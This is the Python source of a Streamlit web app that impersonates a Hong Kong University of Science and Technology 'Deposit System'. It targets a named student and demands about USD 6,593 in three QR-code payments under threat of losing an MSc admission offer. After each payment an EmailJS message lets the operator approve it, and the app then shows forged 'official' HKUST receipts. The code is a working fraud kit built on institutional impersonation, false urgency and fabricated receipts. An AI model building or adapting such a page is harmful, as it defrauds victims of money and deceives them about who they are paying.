import streamlit as st
import base64
import os
import time
from datetime import datetime
import requests

# --- 1. 頁面配置與自動去背景工具 ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

def get_base64_bin_file(bin_file):
    if os.path.exists(bin_file):
        with open(bin_file, 'rb') as f:
            data = f.read()
        return base64.b64encode(data).decode()
    return None

# 讀取本地 hkust.png
logo_base64 = get_base64_bin_file("hkust.png")

# --- 2. 注入專業 CSS (解決黑框、Logo 大小、去背景色差) ---
st.markdown(f"""
<style>
/* 隱藏官方 UI */
#MainMenu, header, footer, .stDeployButton {{visibility: hidden !important;}}
[data-testid="stHeader"] {{display: none !important;}}

/* 導航欄樣式 */
.nav-bar {{
    background-color: #003366; 
    padding: 10px 60px;
    display: flex;
    align-items: center;
    color: white;
    border-bottom: 4px solid #A6937C;
    margin: -75px -100px 30px -100px;
}}

/* Logo 放大並去背景融合 */
.nav-logo {{
    height: 85px; 
    width: auto;
    margin-right: 25px;
    mix-blend-mode: screen; 
    display: block;
}}

.system-title {{
    border-left: 2px solid #fff;
    padding-left: 20px;
    font-size: 20px;
    font-weight: 500;
    line-height: 1.2;
}}

/* 卡片與提示框 (嚴格禁止縮進以防止黑框) */
.payment-card {{ background: white; padding: 35px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }}
.deadline-box {{ color: #d32f2f !important; font-weight: bold; font-size: 16px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.6; }}
.info-box {{ background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }}
.receipt-box {{ background: white; border: 1px solid #003366; padding: 40px; border-radius: 5px; color: #000 !important; max-width: 750px; margin: auto; }}
.loader {{ border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }}
@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
""", unsafe_allow_html=True)

# --- 3. 數據與後台狀態管理 ---
STATUS_FILE = "payment_status.txt"
def set_status(s):
    with open(STATUS_FILE, "w") as f: f.write(s)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# 管理員審核邏輯 (action=approve1, 2, 3)
q = st.query_params
if q.get("action") in ["approve1", "approve2", "approve3"]:
    set_status(q.get("action").replace("approve", "approved"))
    st.success("Payment Confirmed! User screen will update.")
    st.stop()

# 核心數據
PAYER = "XINGSHENG WANG"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

# EmailJS 配置 (請填入您的正確 Key)
USER_ID = "2Mp8IGmfTvvDLueQN"
SERVICE_ID = "service_hjp7b95"
TEMPLATE_ID = "template_br5xnjm"
MY_URL = "https://hkust-pre-of-tpg.streamlit.app" 

if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. 渲染導航欄 ---
logo_html = f'<img src="data:image/png;base64,{logo_base64}" class="nav-logo">' if logo_base64 else ""
st.markdown(f"""
<div class="nav-bar">
    {logo_html}
    <div class="system-title">Deposit System<br><span style="font-size:13px; font-weight:normal;">Official Online Portal</span></div>
</div>
""", unsafe_allow_html=True)

# --- 5. 支付流程邏輯 ---

# 通用 Checking 頁面
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div class="loader"></div><h2 style="color:#003366;">Verifying Installment {stage}...</h2><p>Our Finance Office is verifying your transaction. Page updates automatically.</p></div>""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# 階段 1: 支付 1200 USD
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments.</p>
<div class="info-box"><b>Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and TLE MSc program seat.
</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Step: 1st Installment - USD 1,200.00</p>
</div>""", unsafe_allow_html=True)
        st.image("qr1.png" if os.path.exists("qr1.png") else "https://placeholder.com", width=400)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# 階段 1 收據 -> 進入階段 2
elif st.session_state.step == "receipt1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box" style="text-align:center;"><h4 style="color:#003366;">OFFICIAL RECEIPT (STAGE 1)</h4><p>Payer: {PAYER} | Received: USD 1,200.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold; margin:auto;">VERIFIED</div></div>""", unsafe_allow_html=True)
        st.write("## ")
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
            st.session_state.step = "pay2"; st.rerun()

# 階段 2: 支付 3000 USD
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Deadline: 4:00 PM, April 24th.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Amount: USD 3,000.00</p></div>""", unsafe_allow_html=True)
        st.image("qr2.png" if os.path.exists("qr2.png") else "https://placeholder.com", width=400)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

# 階段 2 收據 -> 進入階段 3
elif st.session_state.step == "receipt2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box" style="text-align:center;"><h4 style="color:#003366;">OFFICIAL RECEIPT (STAGE 2)</h4><p>Payer: {PAYER} | Received: USD 3,000.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold; margin:auto;">VERIFIED</div></div>""", unsafe_allow_html=True)
        st.write("## ")
        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
            st.session_state.step = "pay3"; st.rerun()

# 階段 3: 支付 2393.21 USD
elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Final Step to secure your enrollment.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Amount: USD 2,393.21</p></div>""", unsafe_allow_html=True)
        st.image("qr3.png" if os.path.exists("qr3.png") else "https://placeholder.com", width=400)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

# 最終大收據
elif st.session_state.step == "receipt3":
    st.markdown(f"""<div class="receipt-box">
<div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
<h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
<p style="font-size:11px; color:#666 !important;">Official Electronic Receipt</p>
</div>
<h3 style="text-align:center; text-decoration: underline;">FULL DEPOSIT RECEIPT</h3><br>
<table style="width:100%; color:#000;">
<tr><td><b>Receipt No:</b></td><td style="text-align:right;">UST-FULL-{int(time.time())}</td></tr>
<tr><td><b>Received from:</b></td><td style="text-align:right;">{PAYER}</td></tr>
<tr><td><b>Total Amount:</b></td><td style="text-align:right;"><b>HK$ {HKD_TOTAL} (USD {USD_TOTAL})</b></td></tr>
</table><br>
<div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold;">HKUST FINANCE OFFICE<br>FULL PAYMENT VERIFIED</div>
</div>""", unsafe_allow_html=True)
    st.balloons()

# 頁腳
st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
